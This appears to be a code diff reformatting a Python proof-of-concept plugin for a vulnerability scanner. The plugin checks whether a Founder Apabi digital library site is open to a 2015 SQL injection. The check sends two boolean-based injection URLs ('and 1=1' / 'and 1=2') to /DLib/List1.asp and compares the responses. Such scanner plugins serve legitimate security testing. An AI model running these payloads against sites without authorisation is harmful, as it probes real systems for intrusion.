@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Founder_0001' # 平台漏洞编号，留空
+    vuln_id = 'Founder_0001'  # 平台漏洞编号，留空
     name = '方正Apabi数字资源平台MSSQL SQL注射'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-03-26'  # 漏洞公布时间
     desc = '''
         方正Apabi数字资源平台 /DLib/List1.asp 页面：
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '方正Apabi数字资源平台'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'af7872d9-ea51-4057-b723-39137733f561'
@@ -31,15 +33,17 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             hh = hackhttp.hackhttp()
-            #No.1 http://www.wooyun.org/bugs/wooyun-2010-0103712
+            # No.1 http://www.wooyun.org/bugs/wooyun-2010-0103712
             payload1 = "/DLib/List1.asp?lang=gb&act=CategoryBrowse&DocGroupID=2&CategoryTypeID=1%20and%20%1=1&BrowseID=1&BrowseName=%BC%C6%CB%E3%BB%FA%CD%F8%C2%E7"
             payload2 = "/DLib/List1.asp?lang=gb&act=CategoryBrowse&DocGroupID=2&CategoryTypeID=1%20and%20%1=2&BrowseID=1&BrowseName=%BC%C6%CB%E3%BB%FA%CD%F8%C2%E7"
-            code1, head1, body1, errcode1, final_url1 = hh.http(self.target + payload1)
-            code2, head2, body2, errcode2, final_url2 = hh.http(self.target + payload2)
-            if code1==200 and code2==200 and len(body1)!=len(body2):
-                #security_hole(arg+payload1)
+            code1, head1, body1, errcode1, final_url1 = hh.http(
+                self.target + payload1)
+            code2, head2, body2, errcode2, final_url2 = hh.http(
+                self.target + payload2)
+            if code1 == 200 and code2 == 200 and len(body1) != len(body2):
+                # security_hole(arg+payload1)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -48,6 +52,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
